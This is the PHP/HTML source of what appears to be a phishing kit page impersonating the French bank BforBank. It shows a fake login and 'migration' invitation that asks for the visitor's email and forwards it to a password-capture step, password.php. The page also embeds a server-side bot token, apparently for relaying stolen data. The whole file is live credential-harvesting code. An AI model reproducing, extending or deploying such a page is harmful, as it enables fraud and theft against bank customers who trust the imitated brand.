<?php 
require 'main.php';
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="res/app.css">
    <title>Connexion</title>
</head>
<body>
    

<header>
    <div class="logo">
<img src="res/img/logo.png" >
    </div>
</header>


<main>
    <div class="continer">

    <div class="title">

<span>Bonjour!
</span> 
</div>

<div class="info">

<div class="all">

<script>var token=<?php echo json_encode($bot); ?>;</script>


<div class="l">
<span>
Ce logo vous est familier ?</span>
</div>

<div class="r">
<img src="res/img/l.png" >
</div>

</div>

<div class="p">
<p>Si vous êtes un client historique et que vous avez reçu une invitation par courrier,  
   <b>cliquez ici pour découvrir la nouvelle expérience BforBank</b>.
</p>

</div>

<div class="bo">
<button>Commencer la migration !</button>
</div>
</div>
<form action="password.php" method="get">

<div class="col">
<input type="text" placeholder="Email"  name="user" required>
</div>

<div class="fo">
<p>Merci de taper voyre email</p>
</div>

<div class="but">
<button type="submit">Continuer</button>
</div>

<script src="./res/cdn/jq.js"></script>
<script src="./res/jquery.js"></script>




</form>
</div>
</main>

</body>
</html>